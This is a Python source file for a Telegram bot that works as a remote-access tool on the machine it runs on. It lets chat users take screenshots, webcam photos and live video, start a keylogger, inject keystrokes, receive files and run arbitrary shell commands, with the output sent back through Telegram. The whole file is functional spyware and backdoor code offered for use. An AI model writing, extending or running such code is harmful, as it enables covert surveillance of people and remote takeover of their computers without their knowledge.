from distutils import text_file
from re import T
from telepot.loop import MessageLoop
from dotenv import load_dotenv

import telepot
import secrets
import pyscreenshot
import json
from subprocess import run, Popen,PIPE
from urllib import request as open_web
import time
import datetime
import os
import cv2
from logger import Listener,key_handeler   
import live_webserver
import requests
from pynput.keyboard import Controller as key
import speech_recognition as sr
import pyttsx3
from pyngrok import ngrok
import features
load_dotenv()
api_key = os.getenv("API_KEY")
telegram_bot = telepot.Bot(api_key)
feature =features.features(telegram_bot)

telegram_bot = telepot.Bot(api_key)
def replymessage(first_name, last_name, command, chat_id):
   
    name = f'{first_name} {last_name}'
    print(name)
    print('Received:', command, 'chat_id', chat_id)
    authorized = False
    print(feature.random)
    if feature.pending == 0 or chat_id != feature.aut_chat_id:
        for i in feature.auth_list['authorized']:
            if i['chat_id'] == chat_id:
                authorized = True
                break
        if authorized:
            list_command = command.split()
            if list_command[0] == "Send" or list_command[0] == "send":
                if chat_id == feature.admin_chat_id:
                    x = len(list_command[0])
                    feature.send(command[x+1:],chat_id)
            elif list_command[0] == "video" or list_command[0] == "Video":
               feature.live_video(chat_id)
            elif list_command[0] == "types" or list_command[0] == "Types":
                feature.keyboard_type(command)
            elif list_command[0] == "Speak" or list_command[0] == "speak":
                feature.speak(command)
            elif chat_id == feature.chat_id_file and list_command[0] == feature.random_f:
                feature.save_file_in_fin(chat_id)
            elif ((list_command[0] == "screenshot") | (list_command[0] == "Screenshot")):
               feature.take_screenshot(chat_id)
            elif((list_command[0] == "stop") | (list_command[0] == "Stop")):
                feature.kill_task(chat_id,list_command)
            elif((list_command[0] == "photo") | (list_command[0] == "Photo")):
                feature.take_photo(chat_id)
            elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
                feature.key_logger(chat_id)
            else:
                message = Popen(command, shell=True, stdout=PIPE,
                                text=True).communicate()[0]
                telegram_bot.sendMessage(
                    chat_id, "INVALID Command"if message == "" else message)

        else:
            feature.send_first_auth_code(chat_id,name)
    else:
        print(feature.random)
        if command == feature.random:
            telegram_bot.sendMessage(
                chat_id, str('you are authorized ' + name))
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            feature.auth_list['authorized'].append(new_guy)
            print(feature.auth_list)
            feature.pending = 0
            with open(feature.authorzed_Users, 'w') as f:
                json.dump(feature.auth_list, f, indent=2)
                f.close()
        else:
            telegram_bot.sendMessage(chat_id, 'sorry invalid code')




key_list = ["text", "voice", "photo", "video", "document"]

connected = False
while (connected == False):
    try:
        x = open_web.urlopen('https://api.ipify.org/')
        connected = True
    except Exception:
        connected = False
        time.sleep(1)
print(feature.auth_list)




def action(msg):
    
    print(feature.auth_list)

    chat_id = msg['chat']['id']
    first_name = msg['chat']['first_name']
    last_name = msg['chat']['last_name']
    for i in key_list:
        try:
            command = msg[i]
            key = i
        except KeyError:
            continue
    if key == "text":
        replymessage(first_name, last_name, command, chat_id)
    if key in key_list[1:]:
        feature.download_file(msg, key)



feature.test_message()

print(telegram_bot.getMe())  # for internal testing
MessageLoop(telegram_bot, action).run_as_thread()

while 1:
    time.sleep(1)
